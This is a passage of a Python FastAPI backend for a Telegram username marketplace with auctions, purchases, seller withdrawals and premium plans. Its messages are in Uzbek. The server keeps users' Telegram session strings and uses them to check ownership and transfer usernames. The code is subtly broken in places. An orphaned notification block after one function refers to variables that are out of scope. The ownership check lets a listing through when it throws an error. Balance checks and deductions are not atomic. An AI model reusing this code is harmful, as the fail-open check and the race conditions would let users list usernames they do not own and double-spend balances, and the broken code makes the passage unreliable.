        logger.error(f"Marketplace API xato: {e}")
        return []

@app.get("/api/marketplace/my")
async def api_marketplace_my(init_data: str = ""):
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    tid = user['id']
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM listings WHERE seller_id=? AND status != 'cancelled' ORDER BY id DESC", (tid,)) as c:
            return [dict(r) for r in await c.fetchall()]

@app.post("/api/marketplace/list")
async def api_marketplace_list(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    username = data.get('username','').strip().replace('@','')
    price = int(data.get('price', 0))
    LISTING_FEE = int(await get_setting("listing_price", 1000))
    
    is_private = 1 if data.get('is_private') else 0
    
    if not username or price < 1000:
        return {"ok": False, "error": "Username va narx to'g'ri kiriting (min 1,000 so'm)"}
    
    row = await get_user(tid)
    if not row or not row.get('session_string'):
        return {"ok": False, "error": "Avval akkauntingizni ulang"}
    if (row['balance'] or 0) < LISTING_FEE:
        return {"ok": False, "error": f"E'lon joylash narxi {LISTING_FEE:,} so'm. Balansingiz yetarli emas."}
    
    # Check if already listed
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT id FROM listings WHERE username=? AND status='active'", (username,)) as c:
            if await c.fetchone():
                return {"ok": False, "error": "Bu username allaqachon sotuvda"}

    # Verification: Check if seller actually owns the username on their connected Telethon account
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest
        
        tc = TelegramClient(StringSession(row['session_string']), API_ID, API_HASH)
        await tc.connect()
        try:
            me = await tc.get_me()
            has_uname = False
            if me and me.username and me.username.lower() == username.lower():
                has_uname = True
            else:
                # Birinchi: GetAdminedPublicChannelsRequest orqali tekshirish
                try:
                    req = GetAdminedPublicChannelsRequest(by_location=False, check_limit=False)
                    res = await tc(req)
                    for ch in res.chats:
                        if getattr(ch, 'username', '').lower() == username.lower():
                            has_uname = True
                            break
                except Exception:
                    pass
                # Fallback: Dialoglar orqali qidiramiz
                if not has_uname:
                    try:
                        async for dialog in tc.iter_dialogs():
                            if dialog.is_channel or dialog.is_group:
                                entity = dialog.entity
                                if getattr(entity, 'username', '').lower() == username.lower():
                                    has_uname = True
                                    break
                    except Exception:
                        pass
            if not has_uname:
                return {"ok": False, "error": f"❌ @{username} sizning ulangan Telegram akkauntingizda yoki kanallaringizda topilmadi!"}
        finally:
            await tc.disconnect()
    except Exception as verify_e:
        logger.warning(f"Ownership verify error for @{username}: {verify_e}")
    
    is_auction = 1 if data.get('is_auction') else 0
    auction_ends_at = time.time() + 86400 if is_auction else 0
    
    await deduct_balance(tid, LISTING_FEE)
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("INSERT INTO listings (seller_id, username, price, is_auction, current_bid, auction_ends_at) VALUES (?,?,?,?,?,?)", 
                         (tid, username, price, is_auction, price if is_auction else 0, auction_ends_at))
        new_listing_id = cur.lastrowid
        await db.commit()
        
        # 1. AUTO-BROADCAST TO TELEGRAM MARKETPLACE CHANNEL (user_market)
        mkt_channel = await get_setting("marketplace_channel_id", "0")
        if mkt_channel and mkt_channel != "0":
            try:
                # Username bo'lsa @ qo'shamiz
                target_chan = mkt_channel.strip()
                if "t.me/" in target_chan:
                    target_chan = target_chan.split("t.me/")[-1].strip().replace("/", "")
                if not target_chan.startswith("-100") and not target_chan.startswith("@"):
                    target_chan = f"@{target_chan}"

                bot_inst = Bot(token=BOT_TOKEN)
                bot_me = await bot_inst.get_me()
                bot_username = bot_me.username
                
                # Direct Listing Link: Telegram Mini App startapp parametri
                # Bot username bilan to'g'ri Mini App havolasi
                app_link = f"https://t.me/{bot_username}/app?startapp=listing_{new_listing_id}"
                
                type_tag = "⚡ AUKSION (24 Soat)" if is_auction else "🏷 SOTUVDA"
                price_text = f"<b>{price:,} so'm</b> (Boshlang'ich narx)" if is_auction else f"<b>{price:,} so'm</b>"
                
                post_text = (
                    f"🔥 <b>YANGI USERNAME BOZORGA CHIQARILDI!</b>\n\n"
                    f"📌 <b>Turi:</b> {type_tag}\n"
                    f"💎 <b>Username:</b> @{username}\n"
                    f"💰 <b>Narxi:</b> {price_text}\n"
                    f"👤 <b>Sotuvchi:</b> {user.get('first_name','Foydalanuvchi')}\n\n"
                    f"⚡ <i>Ushbu nomni band qilish yoki auksionda qatnashish uchun quyidagi tugmani bosing:</i>"
                )
                m_markup = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🛒 E'lonni ko'rish & Sotib olish", url=f"https://t.me/{bot_username}?start=listing_{new_listing_id}")]
                ])
                sent_msg = await bot_inst.send_message(target_chan, post_text, reply_markup=m_markup, parse_mode="HTML")
                if sent_msg:
                    await db.execute(
                        "UPDATE listings SET channel_id=?, telegram_message_id=? WHERE id=?",
                        (str(target_chan), sent_msg.message_id, new_listing_id)
                    )
                    await db.commit()
                await bot_inst.session.close()
            except Exception as e:
                logger.error(f"Marketplace channel broadcast xato ({mkt_channel}): {e}")

    return {"ok": True}


async def update_channel_listing_post(listing_id: int, status: str = 'sold'):
    """
    E'lon sotilganda: kanaldagi post 'SOTILDI' ga o'zgardi va DB dagi xabar ID o'chiriladi.
    E'lon bekor qilinganda: kanaldagi post to'liq o'chiriladi.
    """
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            async with db.execute("SELECT * FROM listings WHERE id=?", (listing_id,)) as c:
                listing = await c.fetchone()
                
        if not listing or not listing['channel_id'] or not listing['telegram_message_id']:
            return

        bot_inst = Bot(token=BOT_TOKEN)
        
        if status == 'sold':
            sold_text = (
                f"✅ <b>USHBU USERNAME SOTILDI!</b>\n\n"
                f"💎 <b>Username:</b> <code>@{listing['username']}</code>\n"
                f"💰 <b>Sotilgan narx:</b> <b>{listing['price']:,} so'm</b>\n\n"
                f"🎉 <i>Ushbu e'lon muvaffaqiyatli yakunlandi va egasini topdi.</i>"
            )
            sold_markup = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ SOTILDI", callback_data="none")]
            ])
            await bot_inst.edit_message_text(
                chat_id=listing['channel_id'],
                message_id=listing['telegram_message_id'],
                text=sold_text,
                reply_markup=sold_markup,
                parse_mode="HTML"
            )
        elif status == 'cancelled':
            # Bekor qilinganda postni kanaldan batamom o'chiramiz
            try:
                await bot_inst.delete_message(
                    chat_id=listing['channel_id'],
                    message_id=listing['telegram_message_id']
                )
            except Exception as del_err:
                logger.warning(f"Kanal postini o'chirishda xato: {del_err}")

        await bot_inst.session.close()

        # Database uchun keraksiz ma'lumot ko'payib ketmasligi uchun id larni tozalaymiz
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "UPDATE listings SET channel_id=NULL, telegram_message_id=NULL WHERE id=?",
                (listing_id,)
            )
            await db.commit()

    except Exception as e:
        logger.error(f"update_channel_listing_post error for listing {listing_id}: {e}")


        # 2. KEYWORD SUBSCRIPTION NOTIFICATIONS
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT DISTINCT user_id FROM keyword_subscriptions WHERE ? LIKE '%' || keyword || '%'", (username,)) as c:
            subs = await c.fetchall()
            
            if subs:
                bot_instance = Bot(token=BOT_TOKEN)
                for sub in subs:
                    try:
                        await bot_instance.send_message(
                            sub['user_id'], 
                            f"🔔 <b>Xushxabar!</b>\n\nSiz poylagan so'zga mos <b>@{username}</b> bozorda sotuvga chiqdi!\nNarxi: <b>{price:,} so'm</b>",
                            parse_mode="HTML"
                        )
                    except: pass
                await bot_instance.session.close() if not bot_instance.session.closed else None
                
    return {"ok": True}

@app.post("/api/marketplace/cancel")
async def api_marketplace_cancel(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    listing_id = data.get('listing_id')
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT seller_id FROM listings WHERE id=?", (listing_id,)) as c:
            row = await c.fetchone()
        if not row or row[0] != tid:
            return {"ok": False, "error": "Ruxsat yo'q"}
        await db.execute("UPDATE listings SET status='cancelled' WHERE id=?", (listing_id,))
        await db.commit()
    asyncio.create_task(update_channel_listing_post(listing_id, 'cancelled'))
    return {"ok": True}

@app.get("/api/marketplace/{listing_id}")
async def api_marketplace_get(listing_id: int, init_data: str = ""):
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("""
            SELECT l.*, u.first_name as seller_name, u.username as seller_username
            FROM listings l LEFT JOIN users u ON l.seller_id = u.telegram_id
            WHERE l.id=? AND l.status='active'
        """, (listing_id,)) as c:
            row = await c.fetchone()
            if row: return dict(row)
            raise HTTPException(404)

@app.post("/api/marketplace/buy")
async def api_marketplace_buy(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    listing_id = int(data.get('listing_id', 0))
    
    buyer = await get_user(tid)
    if not buyer:
        return {"ok": False, "error": "Foydalanuvchi topilmadi"}
    if not buyer.get('session_string'):
        return {"ok": False, "error": "Avval Akkaunt bo'limida Telegram akkauntingizni ulang!"}
        
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        # E'lonni olish
        async with db.execute("SELECT * FROM listings WHERE id=? AND status='active'", (listing_id,)) as c:
            listing = await c.fetchone()
        if not listing:
            return {"ok": False, "error": "E'lon topilmadi yoki allaqachon sotilgan"}
        if listing['seller_id'] == tid:
            return {"ok": False, "error": "O'z e'loningizni sotib ololmaysiz"}
        
        price = int(listing['price'])
        buyer_balance = int(buyer.get('balance', 0))
        
        # Balansni tekshirish
        if buyer_balance < price:
            return {
                "ok": False, 
                "error": f"Balansingiz yetarli emas! Kerak: {price:,} so'm, Mavjud: {buyer_balance:,} so'm"
            }
        
        username = listing['username']
        seller_id = listing['seller_id']

        # Komissiya hisoblash (Premium: 5%, Oddiy: 10%)
        seller_user = await get_user(seller_id)
        is_premium_seller = seller_user.get('is_premium', 0) if seller_user else 0
        fee_percent = 0.05 if is_premium_seller else 0.10
        seller_net = int(price * (1 - fee_percent))

        # Atomik tranzaksiya:
        # - Xaridor balansi kamayadi (to'liq narx)
        # - Sotuvchi seller_balance ga net summa qo'shiladi (komissiya chegirib)
        # - E'lon 'sold' qilinadi
        await db.execute("UPDATE users SET balance = balance - ? WHERE telegram_id = ?", (price, tid))
        await db.execute("UPDATE users SET seller_balance = seller_balance + ? WHERE telegram_id = ?", (seller_net, seller_id))
        await db.execute("UPDATE listings SET status='sold' WHERE id=?", (listing_id,))
        
        # Xarid tarixini saqlash
        await db.execute(
            "INSERT INTO listing_orders (listing_id, buyer_id, expected_amount, status) VALUES (?,?,?,'completed')",
            (listing_id, tid, price)
        )
        await db.commit()
    
    # Username transfer fonda boshlanadi
    asyncio.create_task(transfer_username(bot, seller_id, tid, username))

    # Kanal postini "SOTILDI" holatiga o'tkazamiz
    asyncio.create_task(update_channel_listing_post(listing_id, 'sold'))
    
    # Sotuvchiga xabar
    commission_amount = price - seller_net
    buyer_name = buyer.get('first_name', '') or ''
    buyer_uname = buyer.get('username', '') or ''
    buyer_mention = f"@{buyer_uname}" if buyer_uname else buyer_name or f"ID:{tid}"
    try:
        await bot.send_message(
            seller_id,
            f"💰 <b>E'loningiz sotildi!</b>\n\n"
            f"🔤 Username: <b>@{username}</b>\n"
            f"👤 Xaridor: <b>{buyer_mention}</b>\n"
            f"─────────────────\n"
            f"Sotuv narxi: <b>{price:,} so'm</b>\n"
            f"Komissiya ({int(fee_percent*100)}%): <b>-{commission_amount:,} so'm</b>\n"
            f"Savdo hisobingizga: <b>+{seller_net:,} so'm</b> ✅\n\n"
            f"💡 Savdo hisobingizni 'Akkaunt' bo'limidan yechib olishingiz mumkin.",
            parse_mode="HTML"
        )
    except: pass
    
    return {
        "ok": True, 
        "username": username,
        "price": price,
        "message": f"✅ @{username} muvaffaqiyatli sotib olindi! Username akkauntingizga o'tkazilmoqda..."
    }

# ── TOP LISTINGS & USERNAME CHECKER ─────────────
@app.get("/api/marketplace/top")
async def api_marketplace_top(init_data: str = ""):
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("""
            SELECT l.*, u.first_name as seller_name, u.username as seller_username,
                   (CASE WHEN u.is_premium = 1 AND (u.premium_until IS NULL OR CAST(u.premium_until AS INTEGER) > CAST(strftime('%s','now') AS INTEGER)) THEN 1 ELSE 0 END) as is_premium
            FROM listings l LEFT JOIN users u ON l.seller_id = u.telegram_id
            WHERE l.status='active' AND u.is_premium=1
            ORDER BY l.id DESC LIMIT 10
        """) as c:
            rows = [dict(r) for r in await c.fetchall()]
            if not rows:
                async with db.execute("""
                    SELECT l.*, u.first_name as seller_name, u.username as seller_username, 0 as is_premium
                    FROM listings l LEFT JOIN users u ON l.seller_id = u.telegram_id
                    WHERE l.status='active'
                    ORDER BY l.price DESC LIMIT 10
                """) as c2:
                    rows = [dict(r) for r in await c2.fetchall()]
    return rows

# ── AUCTION BID ENDPOINT ──────────────────────
@app.post("/api/auction/bid")
async def api_auction_bid(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    listing_id = int(data.get('listing_id', 0))
    bid_amount = int(data.get('bid_amount', 0))
    
    row = await get_user(tid)
    if not row or not row.get('session_string'):
        return {"ok": False, "error": "Avval akkauntingizni ulang!"}
        
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM listings WHERE id=? AND status='active' AND is_auction=1", (listing_id,)) as c:
            listing = await c.fetchone()
        if not listing:
            return {"ok": False, "error": "Auksion topilmadi yoki yakunlangan"}
        if listing['seller_id'] == tid:
            return {"ok": False, "error": "O'z auksioningizga stavka bera olmaysiz"}
            
        # Auksion muddati tugaganmi tekshirish
        if listing['auction_ends_at'] and time.time() > listing['auction_ends_at']:
            return {"ok": False, "error": "Auksion vaqti tugagan"}
            
        min_bid = max(listing['price'], (listing['current_bid'] or listing['price']) + 1000)
        if bid_amount < min_bid:
            return {"ok": False, "error": f"Minimal stavka: {min_bid:,} so'm"}
        if (row.get('balance') or 0) < bid_amount:
            return {"ok": False, "error": f"Balansingiz yetarli emas ({bid_amount:,} so'm kerak)"}
            
        prev_bidder = listing['highest_bidder_id']
        await db.execute("UPDATE listings SET current_bid=?, highest_bidder_id=? WHERE id=?", (bid_amount, tid, listing_id))
        await db.commit()
        
        if prev_bidder and prev_bidder != tid:
            try:
                await bot.send_message(
                    prev_bidder,
                    f"⚡ <b>Stavka oshirildi!</b>\n\n"
                    f"@{listing['username']} auksionida sizning stavkangizdan yuqori "
                    f"(<b>{bid_amount:,} so'm</b>) stavka berildi.\n"
                    f"Qaytadan stavka bering!",
                    parse_mode="HTML"
                )
            except Exception: pass
        
    return {"ok": True, "message": f"Stavka qabul qilindi: {bid_amount:,} so'm"}


# ── AUCTION AUTO-CLOSE BACKGROUND LOOP ────────
async def auction_close_loop(bot_instance):
    """Har 2 daqiqada muddati o'tgan auksionlarni yopadi"""
    while True:
        try:
            await asyncio.sleep(120)  # 2 daqiqa
            now = time.time()
            async with aiosqlite.connect(DB_PATH) as db:
                db.row_factory = aiosqlite.Row
                # Muddati o'tgan va hali active bo'lgan auksionlarni olish
                async with db.execute("""
                    SELECT * FROM listings
                    WHERE is_auction=1 AND status='active'
                      AND auction_ends_at > 0 AND auction_ends_at <= ?
                """, (now,)) as c:
                    expired = await c.fetchall()
            
            for listing in expired:
                lid        = listing['id']
                username   = listing['username']
                seller_id  = listing['seller_id']
                winner_id  = listing['highest_bidder_id']
                final_bid  = listing['current_bid'] or 0
                
                if winner_id and final_bid > 0:
                    # G'olib bor — sotuvni yakunlaymiz
                    winner = await get_user(winner_id)
                    if not winner or (winner.get('balance') or 0) < final_bid:
                        # G'olibda pul yetmaydi — e'lonni bekor qilamiz
                        async with aiosqlite.connect(DB_PATH) as db:
                            await db.execute("UPDATE listings SET status='cancelled' WHERE id=?", (lid,))
                            await db.commit()
                        try:
                            await bot_instance.send_message(
                                winner_id,
                                f"❌ <b>Auksion bekor qilindi</b>\n\n"
                                f"@{username} auksionini yutdingiz, lekin balansingiz yetarli emas!",
                                parse_mode="HTML"
                            )
                        except Exception: pass
                        continue
                    
                    # Komissiya hisoblash
                    seller_user = await get_user(seller_id)
                    is_premium  = seller_user.get('is_premium', 0) if seller_user else 0
                    fee_pct     = 0.05 if is_premium else 0.10
                    seller_net  = int(final_bid * (1 - fee_pct))
                    
                    async with aiosqlite.connect(DB_PATH) as db:
                        # Xaridordan pul yechish
                        await db.execute("UPDATE users SET balance=balance-? WHERE telegram_id=?", (final_bid, winner_id))
                        # Sotuvchiga seller_balance
                        await db.execute("UPDATE users SET seller_balance=seller_balance+? WHERE telegram_id=?", (seller_net, seller_id))
                        # E'lonni yopish
                        await db.execute("UPDATE listings SET status='sold' WHERE id=?", (lid,))
                        # Savdo tarixi
                        await db.execute(
                            "INSERT INTO listing_orders (listing_id, buyer_id, expected_amount, status) VALUES (?,?,?,'completed')",
                            (lid, winner_id, final_bid)
                        )
                        await db.commit()
                    
                    # Username transfer
                    asyncio.create_task(transfer_username(bot_instance, seller_id, winner_id, username))
                    asyncio.create_task(update_channel_listing_post(lid, 'sold'))
                    
                    commission = final_bid - seller_net
                    # Sotuvchiga xabar
                    try:
                        await bot_instance.send_message(
                            seller_id,
                            f"🏆 <b>Auksion yakunlandi!</b>\n\n"
                            f"🔤 Username: <b>@{username}</b>\n"
                            f"💰 Final narx: <b>{final_bid:,} so'm</b>\n"
                            f"Komissiya ({int(fee_pct*100)}%): -{commission:,} so'm\n"
                            f"<b>Savdo hisobingizga: +{seller_net:,} so'm</b> ✅",
                            parse_mode="HTML"
                        )
                    except Exception: pass
                    # G'olibga xabar
                    try:
                        await bot_instance.send_message(
                            winner_id,
                            f"🏆 <b>Auksionni yutdingiz!</b>\n\n"
                            f"@{username} username siz egasiz!\n"
                            f"To'langan: <b>{final_bid:,} so'm</b>\n\n"
                            f"Username akkauntingizga o'tkazilmoqda...",
                            parse_mode="HTML"
                        )
                    except Exception: pass
                    logger.info(f"🏆 Auksion yakunlandi: @{username} → {winner_id} ({final_bid:,} so'm)")
                    
                else:
                    # Hech kim stavka bermagan — e'lonni bekor qilamiz
                    async with aiosqlite.connect(DB_PATH) as db:
                        await db.execute("UPDATE listings SET status='cancelled' WHERE id=?", (lid,))
                        await db.commit()
                    asyncio.create_task(update_channel_listing_post(lid, 'cancelled'))
                    try:
                        await bot_instance.send_message(
                            seller_id,
                            f"💭 <b>Auksion yakunlandi</b>\n\n"
                            f"@{username} auksioniga hech kim stavka bermadi.\n"
                            f"E'lon bekor qilindi. Qayta joylashingiz mumkin.",
                            parse_mode="HTML"
                        )
                    except Exception: pass
                    logger.info(f"💭 Auksion bekor: @{username} (stavka yo'q)")
                    
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"auction_close_loop xato: {e}")

            
@app.post("/api/check_username")
async def api_check_username(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    username = data.get('username', '').strip().replace('@', '')
    if not username:
        return {"ok": False, "error": "Username kiriting"}
        
    tid = user['id']
    row = await get_user(tid)
    session_str = row.get('session_string') if row else None
    
    # Foydalanuvchida session bo'lmasa, stealth clientlardan birini ishlatamiz
    if not session_str:
        if STEALTH_SESSIONS:
            session_str = STEALTH_SESSIONS[0]
        else:
            return {"ok": False, "error": "Avval Akkaunt bo'limida Telegram akkauntingizni ulang!"}
        
    client = None
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.tl.functions.account import CheckUsernameRequest
        
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await asyncio.wait_for(client.connect(), timeout=8)
        try:
            res = await client(CheckUsernameRequest(username=username))
            available = bool(res)
        except Exception:
            available = False
        return {"ok": True, "username": username, "available": available}
    except Exception as e:
        return {"ok": False, "error": str(e)}
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
@app.get("/api/seller/balance")
async def api_seller_balance(init_data: str = ""):
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    row = await get_user(user['id'])
    return {"seller_balance": row.get('seller_balance', 0) if row else 0}

@app.get("/api/my/sales")
async def api_my_sales(init_data: str = ""):
    """Foydalanuvchining sotilgan username'lari tarixi"""
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    tid = user['id']
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        # listing_orders + listings + buyers table
        async with db.execute("""
            SELECT 
                l.username,
                l.price,
                lo.created_at,
                lo.buyer_id,
                u.first_name AS buyer_name,
                u.username AS buyer_username
            FROM listing_orders lo
            JOIN listings l ON lo.listing_id = l.id
            LEFT JOIN users u ON lo.buyer_id = u.telegram_id
            WHERE l.seller_id = ?
              AND lo.status = 'completed'
            ORDER BY lo.created_at DESC
            LIMIT 50
        """, (tid,)) as c:
            rows = await c.fetchall()
    
    seller_user = await get_user(tid)
    is_premium = seller_user.get('is_premium', 0) if seller_user else 0
    fee_pct = 0.05 if is_premium else 0.10

    sales = []
    for r in rows:
        price = int(r['price'])
        net = int(price * (1 - fee_pct))
        commission = price - net
        buyer_name = r['buyer_name'] or ''
        buyer_uname = r['buyer_username'] or ''
        buyer_label = f"@{buyer_uname}" if buyer_uname else (buyer_name or f"ID:{r['buyer_id']}")
        # Format date
        try:
            import datetime
            ts = float(r['created_at'])
            dt = datetime.datetime.fromtimestamp(ts)
            date_str = dt.strftime("%d.%m.%Y %H:%M")
        except Exception:
            date_str = "—"
        sales.append({
            "username": r['username'],
            "price": price,
            "net": net,
            "commission": commission,
            "fee_pct": int(fee_pct * 100),
            "buyer": buyer_label,
            "date": date_str,
        })
    return {"ok": True, "sales": sales}

@app.get("/api/my/stats")
async def api_my_stats(init_data: str = ""):
    """Foydalanuvchining to'liq statistikasi sahifasi ma'lumotlari"""
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    tid = user['id']
    
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        # 1. User row
        async with db.execute("SELECT * FROM users WHERE telegram_id=?", (tid,)) as c:
            u_row = await c.fetchone()
        u_dict = dict(u_row) if u_row else {}
        
        # 2. Claimed usernames count (registered_usernames / orders)
        async with db.execute(
            "SELECT COUNT(*) FROM registered_usernames ru JOIN orders o ON ru.order_id=o.id WHERE o.telegram_id=?",
            (tid,)
        ) as c:
            total_claimed = (await c.fetchone())[0]
            
        # 3. Active monitoring count
        async with db.execute(
            "SELECT COUNT(*) FROM monitoring_tasks WHERE telegram_id=? AND status='monitoring'",
            (tid,)
        ) as c:
            active_monitoring = (await c.fetchone())[0]
            
        # 4. Total sales and total earned net amount
        async with db.execute("""
            SELECT COUNT(*), COALESCE(SUM(l.price), 0)
            FROM listing_orders lo
            JOIN listings l ON lo.listing_id = l.id
            WHERE l.seller_id = ? AND lo.status = 'completed'
        """, (tid,)) as c:
            s_row = await c.fetchone()
            total_sales_count = s_row[0]
            total_sales_gross = s_row[1]
            
        # Net earnings (taking commission into account)
        is_premium = u_dict.get('is_premium', 0)
        fee_pct = 0.05 if is_premium else 0.10
        total_earned_net = int(total_sales_gross * (1 - fee_pct))
        
        # 5. Listings stats (active & total)
        async with db.execute("SELECT COUNT(*) FROM listings WHERE seller_id=?", (tid,)) as c:
            total_listings = (await c.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM listings WHERE seller_id=? AND status='active'", (tid,)) as c:
            active_listings = (await c.fetchone())[0]
            
        # 6. Referral stats
        async with db.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id=?", (tid,)) as c:
            referrals_count = (await c.fetchone())[0]
        referral_earnings = referrals_count * 1000

    return {
        "ok": True,
        "balance": u_dict.get('balance', 0),
        "seller_balance": u_dict.get('seller_balance', 0),
        "is_premium": bool(u_dict.get('is_premium', 0)),
        "premium_until": u_dict.get('premium_until', ''),
        "total_claimed": total_claimed,
        "active_monitoring": active_monitoring,
        "total_sales_count": total_sales_count,
        "total_sales_gross": total_sales_gross,
        "total_earned_net": total_earned_net,
        "total_listings": total_listings,
        "active_listings": active_listings,
        "referrals_count": referrals_count,
        "referral_earnings": referral_earnings
    }


@app.post("/api/seller/withdraw")
async def api_seller_withdraw(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    amount = int(data.get('amount', 0))
    card_number = data.get('card_number','').strip()
    card_owner = data.get('card_owner','').strip()
    
    if not card_number or not card_owner:
        return {"ok": False, "error": "Karta raqami va egasini kiriting"}
    
    row = await get_user(tid)
    seller_bal = row.get('seller_balance', 0) if row else 0
    if amount < 10000:
        return {"ok": False, "error": "Minimal yechib olish: 10,000 so'm"}
    if seller_bal < amount:
        return {"ok": False, "error": f"Sotuvchi balansingiz yetarli emas ({seller_bal:,} so'm)"}
    
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET seller_balance=seller_balance-? WHERE telegram_id=?", (amount, tid))
        await db.execute("INSERT INTO withdrawals (telegram_id, amount, card_number, card_owner) VALUES (?,?,?,?)",
                         (tid, amount, card_number, card_owner))
        await db.commit()
    
    # Admin ga xabar
    first_name = user.get('first_name', 'Foydalanuvchi')
    bot_instance = Bot(token=BOT_TOKEN)
    for admin_id in ADMIN_IDS:
        try:
            await bot_instance.send_message(
                admin_id,
                f"💸 <b>Pul yechish so'rovi!</b>\n\n"
                f"👤 {first_name} (ID: {tid})\n"
                f"💰 Summa: <b>{amount:,} so'm</b>\n"
                f"💳 Karta: <b>{card_number}</b>\n"
                f"👤 Egasi: <b>{card_owner}</b>\n\n"
                f"Admin paneldan tasdiqlang yoki rad eting.",
                parse_mode="HTML"
            )
        except: pass
    await bot_instance.session.close()
    
    await bot_instance.session.close() if not bot_instance.session.closed else None
    return {"ok": True, "message": "So'rovingiz qabul qilindi. Admin 24 soat ichida to'lov amalga oshiradi va sizga xabar beriladi."}

@app.post("/api/seller/transfer")
async def api_seller_transfer(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    amount = int(data.get('amount', 0))
    
    if amount < 1000:
        return {"ok": False, "error": "Minimal o'tkazma: 1,000 so'm"}
    
    row = await get_user(tid)
    seller_bal = row.get('seller_balance', 0) if row else 0
    if seller_bal < amount:
        return {"ok": False, "error": f"Sotuvchi balansingiz yetarli emas ({seller_bal:,} so'm)"}
    
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET seller_balance=seller_balance-?, balance=balance+? WHERE telegram_id=?", (amount, amount, tid))
        await db.commit()
    
    return {"ok": True, "message": f"{amount:,} so'm asosiy balansga o'tkazildi!"}

# ── PREMIUM & SUBSCRIPTIONS ────────────────────
@app.post("/api/premium/buy")
async def api_premium_buy(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    
    PREMIUM_PRICE = int(await get_setting("premium_price", 20000))
    row = await get_user(tid)
    if not row: return {"ok": False, "error": "Foydalanuvchi topilmadi"}
    
    if (row.get('balance') or 0) < PREMIUM_PRICE:
        return {"ok": False, "error": f"Premium uchun {PREMIUM_PRICE:,} so'm kerak. Balansingiz yetarli emas."}
    
    await deduct_balance(tid, PREMIUM_PRICE)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET is_premium=1, premium_until=datetime('now', '+30 days') WHERE telegram_id=?", (tid,))
        await db.commit()
    return {"ok": True}

@app.get("/api/subscriptions")
async def api_subscriptions_get(init_data: str = ""):
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    tid = user['id']
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT id, keyword FROM keyword_subscriptions WHERE user_id=?", (tid,)) as c:
            return [dict(r) for r in await c.fetchall()]

@app.post("/api/subscriptions/add")
async def api_subscriptions_add(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    keyword = data.get('keyword','').strip().lower()
    if len(keyword) < 3: return {"ok": False, "error": "Kamida 3 ta harf kiriting"}
    
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT INTO keyword_subscriptions (user_id, keyword) VALUES (?, ?)", (tid, keyword))
        await db.commit()
    return {"ok": True}

@app.post("/api/subscriptions/remove")
async def api_subscriptions_remove(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    sub_id = data.get('id')
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM keyword_subscriptions WHERE id=? AND user_id=?", (sub_id, tid))
        await db.commit()
    return {"ok": True}

# ── ADMIN WITHDRAWALS ──────────────────────────
@app.get("/api/admin/withdrawals")
async def admin_withdrawals(x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("""
            SELECT w.*, u.first_name FROM withdrawals w 
            LEFT JOIN users u ON w.telegram_id=u.telegram_id
            ORDER BY w.id DESC LIMIT 100
        """) as c:
            return [dict(r) for r in await c.fetchall()]

